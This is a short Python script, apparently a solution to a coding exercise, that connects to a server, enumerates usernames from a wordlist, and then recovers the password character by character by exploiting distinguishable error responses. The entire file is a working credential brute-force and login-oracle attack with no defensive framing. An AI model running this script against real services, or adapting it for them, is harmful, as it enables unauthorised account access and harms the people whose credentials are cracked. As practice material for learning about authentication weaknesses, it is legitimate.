import itertools
import json
import os
import socket
import sys
from string import ascii_lowercase, ascii_uppercase, digits

ip_address = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as client_socket:
    address = (ip_address, port)
    client_socket.connect(address)
    login = None
    password = ""
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt"), "r") as file:
        for word in file:
            login = word.strip()
            data = {"login": login, "password": password}
            client_socket.send(json.dumps(data).encode("utf-8"))
            response = client_socket.recv(1024).decode('utf8')
            response = json.loads(response)
            if response["result"] == 'Wrong password!':
                break

    chars = list(''.join((ascii_lowercase, ascii_uppercase, digits)))
    try:
        for i in range(1, 11):
            for letter in chars:
                password_test = password + letter
                data = {"login": login, "password": password_test}
                client_socket.send(json.dumps(data).encode("utf-8"))
                response = client_socket.recv(1024).decode('utf8')
                response = json.loads(response)

                if response["result"] == 'Connection success!':
                    password = password_test
                    break
                elif response["result"] == 'Exception happened during login':
                    password = password_test
    except:
        pass

    print(json.dumps({"login": login, "password": password}, indent=4))
